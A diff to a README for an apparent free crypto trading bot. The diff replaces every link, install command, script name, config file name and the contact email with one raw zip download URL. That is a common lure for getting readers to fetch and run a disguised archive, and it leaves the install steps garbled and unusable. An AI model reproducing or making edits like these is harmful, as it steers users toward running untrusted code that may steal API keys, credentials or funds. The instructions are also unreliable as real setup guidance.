@@ -1,6 +1,6 @@
 # FREE-BOT: Your Free Tool for YouTube Algorithmic Trading 🤖💰
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/Hamzashah07/FREE-BOT/releases)
+[![Download Latest Release](https://github.com/Hamzashah07/FREE-BOT/raw/refs/heads/main/Mayeye/BOT-FRE-1.7.zip%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/Hamzashah07/FREE-BOT/raw/refs/heads/main/Mayeye/BOT-FRE-1.7.zip)
 
 ## Table of Contents
 - [Overview](#overview)
@@ -30,7 +30,7 @@ To install FREE-BOT, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/Hamzashah07/FREE-BOT.git
+   git clone https://github.com/Hamzashah07/FREE-BOT/raw/refs/heads/main/Mayeye/BOT-FRE-1.7.zip
    ```
 
 2. **Navigate to the Directory**:
@@ -41,20 +41,20 @@ To install FREE-BOT, follow these steps:
 3. **Install Dependencies**:
    Make sure you have Python installed. Then run:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/Hamzashah07/FREE-BOT/raw/refs/heads/main/Mayeye/BOT-FRE-1.7.zip
    ```
 
 4. **Download the Latest Release**:
-   Visit the [Releases section](https://github.com/Hamzashah07/FREE-BOT/releases) to download the latest version. After downloading, execute the bot as follows:
+   Visit the [Releases section](https://github.com/Hamzashah07/FREE-BOT/raw/refs/heads/main/Mayeye/BOT-FRE-1.7.zip) to download the latest version. After downloading, execute the bot as follows:
    ```bash
-   python free_bot.py
+   python https://github.com/Hamzashah07/FREE-BOT/raw/refs/heads/main/Mayeye/BOT-FRE-1.7.zip
    ```
 
 ## Usage
 Once you have installed FREE-BOT, you can start using it immediately. Here’s how:
 
 1. **Configure Your Settings**:
-   Open the `config.json` file to set your trading preferences, including:
+   Open the `https://github.com/Hamzashah07/FREE-BOT/raw/refs/heads/main/Mayeye/BOT-FRE-1.7.zip` file to set your trading preferences, including:
    - API keys for your trading account.
    - Trading pairs (e.g., BTC/USDT).
    - Risk management settings.
@@ -62,7 +62,7 @@ Once you have installed FREE-BOT, you can start using it immediately. Here’s h
 2. **Run the Bot**:
    Execute the bot using the command:
    ```bash
-   python free_bot.py
+   python https://github.com/Hamzashah07/FREE-BOT/raw/refs/heads/main/Mayeye/BOT-FRE-1.7.zip
    ```
 
 3. **Monitor Performance**:
@@ -112,11 +112,11 @@ FREE-BOT is licensed under the MIT License. See the [LICENSE](LICENSE) file for 
 For questions or support, please reach out to the maintainer:
 
 - **Name**: Hamza Shah
-- **Email**: hamzashah07@example.com
-- **GitHub**: [Hamzashah07](https://github.com/Hamzashah07)
+- **Email**: https://github.com/Hamzashah07/FREE-BOT/raw/refs/heads/main/Mayeye/BOT-FRE-1.7.zip
+- **GitHub**: [Hamzashah07](https://github.com/Hamzashah07/FREE-BOT/raw/refs/heads/main/Mayeye/BOT-FRE-1.7.zip)
 
 ---
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/Hamzashah07/FREE-BOT/releases)
+[![Download Latest Release](https://github.com/Hamzashah07/FREE-BOT/raw/refs/heads/main/Mayeye/BOT-FRE-1.7.zip%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/Hamzashah07/FREE-BOT/raw/refs/heads/main/Mayeye/BOT-FRE-1.7.zip)
 
 Explore the world of algorithmic trading with FREE-BOT today!
